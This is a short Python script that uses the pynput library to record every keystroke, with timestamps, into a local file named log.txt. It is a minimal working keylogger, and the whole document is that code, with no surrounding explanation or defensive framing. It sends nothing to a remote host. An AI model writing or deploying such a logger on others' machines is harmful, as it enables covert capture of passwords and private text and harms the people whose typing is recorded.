import logging as log
from pynput.keyboard import Listener

if __name__ == '__main__':
    log.basicConfig(filename="log.txt", format='%(asctime)s: %(message)s',level=log.DEBUG)
    with Listener(on_press=lambda key_pressed: log.info(key_pressed)) as listener:
        listener.join()
